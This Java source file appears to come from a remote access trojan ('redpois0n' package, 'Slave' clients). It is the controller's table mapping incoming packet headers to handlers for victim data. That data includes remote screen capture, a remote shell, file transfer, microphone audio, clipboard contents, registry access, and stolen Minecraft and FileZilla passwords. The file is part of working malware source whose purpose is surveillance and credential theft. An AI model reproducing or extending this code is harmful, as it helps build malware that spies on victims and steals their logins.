package com.redpois0n.packets.incoming;

import java.util.HashMap;
import java.util.Set;

import com.redpois0n.Slave;
import com.redpois0n.plugins.PluginEventHandler;

public class Packets {

	//private static final HashMap<String, Class<? extends AbstractPacket>> incomingPackets = new HashMap<String, Class<? extends AbstractPacket>>();
	private static final HashMap<Byte, Class<? extends AbstractIncomingPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();

	public static HashMap<Byte, Class<? extends AbstractIncomingPacket>> getIncomingPackets() {
		return incomingPackets;
	}

	static {
		reload();
	}

	private static void reload() {
		incomingPackets.clear();
		incomingPackets.put(/* "LOCALE" */(byte) 10, Packet10InitDefaultLocale.class);
		incomingPackets.put(/* "INSTLOCALES" */(byte) 11, Packet11InstalledLocales.class);
		incomingPackets.put(/* "DISCONNECT" */(byte) 12, Packet12Disconnect.class); // disconnect
		incomingPackets.put(/* "STAT" */(byte) 13, Packet13Status.class); // status
		incomingPackets.put(/* "COMPUTERNAME" */(byte) 14, Packet14InitComputerName.class); // computername
		incomingPackets.put(/* "SERVERID" */(byte) 15, Packet15InitServerID.class); // server
																				// id
		incomingPackets.put(/* "OSNAME" */(byte) 16, Packet16InitOperatingSystem.class); // os
																			// name
		incomingPackets.put(/* "IMAGECOMING" */(byte) 17, Packet17RemoteScreen.class); // image
		incomingPackets.put(/* "SINGLEIMAGECOMING" */(byte) 18, Packet18OneRemoteScreen.class); // single
																									// image
		incomingPackets.put(/* "FOLDERLIST" */(byte) 19, Packet19ListFiles.class); // list
																					// of
																					// folders
																					// in
																					// dir
		incomingPackets.put(/* "PROCESS" */(byte) 20, Packet20Process.class); // process
		incomingPackets.put(/* "CMD" */(byte) 21, Packet21RemoteShell.class); // command
																		// prompt
																		// line
		incomingPackets.put(/* "USERNAME" */(byte) 22, Packet22InitUsername.class); // username
		incomingPackets.put(/* "SERVERPATH" */(byte) 23, Packet23InitInstallPath.class); // server
																					// path
		incomingPackets.put(/* "HERERAM" */(byte) 24, Packet24JVMMemory.class); // ram
		incomingPackets.put(/* "JAVAVER" */(byte) 25, Packet25InitJavaVersion.class); // java
																				// version
		incomingPackets.put(/* "JAVAPATH" */(byte) 26, Packet26InitJavaPath.class); // javapath
		incomingPackets.put(/* "URLSTAT" */(byte) 27, Packet27URLStatus.class); // adv
																				// downloader
																				// info
		incomingPackets.put(/* "LOCALIP" */(byte) 28, Packet28InitLanAddress.class); // local
																				// ip
		incomingPackets.put(/* "FILE" */(byte) 29, Packet29ReceiveFile.class); // file
																		// transfer
		incomingPackets.put(/* "VERSION" */(byte) 30, Packet30InitVersion.class); // version
		incomingPackets.put(/* "DATE" */(byte) 31, Packet31InitInstallationDate.class); // date
																		// of
																		// install
		incomingPackets.put(/* "VARPROP" */(byte) 32, Packet32SystemProperties.class); // system
																				// env
																				// /
																				// prop
		incomingPackets.put(/* "THUMBNAIL" */(byte) 33, Packet33Thumbnail.class); // tumbnail
		incomingPackets.put(/* "DIR" */(byte) 34, Packet34CustomDirectory.class); // get dir
		incomingPackets.put(/* "CHAT" */(byte) 35, Packet35ChatMessage.class); // chat
		incomingPackets.put(/* "MC" */(byte) 36, Packet36MinecraftPassword.class); // minecraft
																	// stealer
		incomingPackets.put(/* "FF" */(byte) 37, Packet37SearchResult.class); // file
																	// finder
		incomingPackets.put(/* "HOSTF" */(byte) 38, Packet38HostFile.class); // host
																			// file
																			// text
		incomingPackets.put(/* "HOSTANSW" */(byte) 39, Packet39HostEditResult.class); // host
																				// file
																				// answer
		incomingPackets.put(/* "UTOR" */(byte) 40, Packet40UTorrentDownload.class); // utorrent
																		// logs
		incomingPackets.put(/* "CBOARDC" */(byte) 41, Packet41Clipboard.class); // clipboard
																				// contents
		incomingPackets.put(/* "FC" */(byte) 42, Packet42PreviewFile.class); // file
																	// preview
		incomingPackets.put(/* "IC" */(byte) 43, Packet43PreviewImage.class); // image
																	// preview
		incomingPackets.put(/* "JVM" */(byte) 44, Packet44SystemJavaProperty.class); // JVM info
		incomingPackets.put(/* "ZIP" */(byte) 45, Packet45ArchivePreview.class); // zip
																		// preview
		incomingPackets.put(/* "MD5" */(byte) 46, Packet46FileHash.class); // file md5
		incomingPackets.put(/* "COUNTRY" */(byte) 47, Packet47InitCountry.class); // user.country
																				// backup
		incomingPackets.put(/* "FZ" */(byte) 48, Packet48FileZillaPassword.class); // filezilla
		incomingPackets.put(/* "LAN" */(byte) 49, Packet49LanDevices.class); // lan view
		incomingPackets.put(/* "IPC" */(byte) 50, Packet50IPConfig.class); // ipconfig
		incomingPackets.put(/* "APORT" */(byte) 51, Packet51ActivePort.class); // active
																			// port
		incomingPackets.put(/* "WINSER" */(byte) 52, Packet52WindowsService.class); // windows
																			// service
																			// listing
		incomingPackets.put(/* "REGSTART" */(byte) 53, Packet53RegistryStartup.class); // registry
																				// startup
																				// listing
		incomingPackets.put(/* "REG" */(byte) 54, Packet54Registry.class); // registry
																		// enter
		incomingPackets.put(/* "INSTPROG" */(byte) 55, Packet55InstalledProgram.class); // installed
																				// program
																				// list
		incomingPackets.put(/* "ADAPT" */(byte) 56, Packet56NetworkAdapter.class); // network
																			// adapters
																			// list
		incomingPackets.put(/* "RAWINFO" */(byte) 57, Packet57RawComputerInfo.class); // raw
																				// info
																				// listing
		incomingPackets.put(/* "SO" */(byte) 58, Packet58Microphone.class); // sound
		incomingPackets.put(/* "IMGLIST" */(byte) 59, Packet59ThumbnailPreview.class); // thumbnail
																				// preview
		incomingPackets.put(/* "ERROR" */(byte) 60, Packet60Error.class); // error
		incomingPackets.put(/* "MONITOR" */(byte) 61, Packet61InitMonitors.class); // monitors
																				// listing
		incomingPackets.put(/* "DRIVES" */(byte) 62, Packet62InitDrives.class); // drives
																			// listing
		incomingPackets.put(/* "RAM" */(byte) 63, Packet63InitRAM.class); // ram
		incomingPackets.put(/* "APS" */(byte) 64, Packet64InitAvailableProcessors.class); // available
																		// processors
		incomingPackets.put(/* "ERRLOG" */(byte) 65, Packet65ErrorLog.class); // error
																			// log
																			// file
		incomingPackets.put(/* "CONFIG" */(byte) 66, Packet66Config.class); // config
																			// list
		incomingPackets.put(/* "PLUGIN" */(byte) 67, Packet67LoadedPlugins.class); // plugin
																			// list
		incomingPackets.put(/* "QUICKDESKTOP" */(byte) 68, Packet68QuickDesktop.class); // quick
																						// desktop
	}

	public static boolean execute(byte header, Slave slave) {
		try {
			AbstractIncomingPacket ac = null;
			Set<Byte> set = incomingPackets.keySet();
			for (Byte str : set) {
				if (str == header) {
					ac = incomingPackets.get(str).newInstance();
					break;
				}
			}
			if (ac != null) {
				ac.read(slave, slave.getDataInputStream());
			} else {
				throw new NullPointerException("Could not find packet: " + header);
			}

			PluginEventHandler.onPacket(slave, header); 

			return ac != null;
		} catch (Exception ex) {
			ex.printStackTrace();
			return false;
		}
	}

}